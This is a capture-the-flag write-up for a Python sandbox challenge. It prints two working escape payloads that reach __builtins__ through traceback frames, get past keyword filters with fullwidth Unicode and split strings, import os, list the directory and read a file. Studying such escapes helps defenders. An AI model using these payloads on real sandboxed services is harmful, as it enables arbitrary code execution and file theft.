# PyRunner2 — VSL CTF 2026

> **Room / Challenge:** PyRunner2 (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** PyRunner2 (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#PyRunner2-54`
- **Points:** `400`
- **Solved:** `21`
- **Date:** `26-01-2026`

---

## Goal

Bypassing Python sandbox filters and get the flag.

## My Solution

Get current files and folders:

```python
try:
    print("[+] Stack Escape (No f-strings)...")

    raise Exception("Yield")

except Exception as e:
    tb = e.__ｔｒａｃｅｂａｃｋ__
    frm = tb.ｔｂ＿ｆｒａｍｅ
    prv = frm.ｆ＿ｂａｃｋ
    sv_g = prv.ｆ＿ｇｌｏｂａｌｓ

    b_key = "".join(('__buil', 'tins__'))
    tools = sv_g[b_key]

    i_key = "".join(('__im', 'port__'))

    try:
        imp = tools[i_key]
    except:
        try:
            get_attr = tools.ｇｅｔａｔｔｒ
        except:
            get_attr = tools['getattr']

        imp = get_attr(tools, i_key)

    my_os = imp('os')

    print("Files:", my_os.listdir('.'))

except Exception as e:
    print("Error:", e)
```

Got suspicious `a` file:

```
[+] Stack Escape (No f-strings)...

Files: ['__pycache__', 'a', 'requirements.txt', 'sandbox.py', 'templates.py', 'app.py']
```

Read `a` file:

```python
try:
    print("[+] Extracting File 'a' and Scanning Root...")
    raise Exception("Yield")

except Exception as e:

    tb = e.__ｔｒａｃｅｂａｃｋ__
    frm = tb.ｔｂ＿ｆｒａｍｅ
    prv = frm.ｆ＿ｂａｃｋ
    sv_g = prv.ｆ＿ｇｌｏｂａｌｓ

    b_key = "".join(('__buil', 'tins__'))
    tools = sv_g[b_key]

    i_key = "".join(('__im', 'port__'))
    try:
        imp = tools[i_key]
    except:
        get_attr = tools.ｇｅｔａｔｔｒ
        imp = get_attr(tools, i_key)

    my_os = imp('os')

    try:
        o_key = "".join(('op', 'en'))
        try:
            opener = tools[o_key]
        except:
            opener = tools.ｏｐｅｎ
        print("Content of 'a':", opener('a').read())
    except Exception as e2:
        print("Could not read 'a':", e2)
except Exception as e:
    print("Error:", e)
```
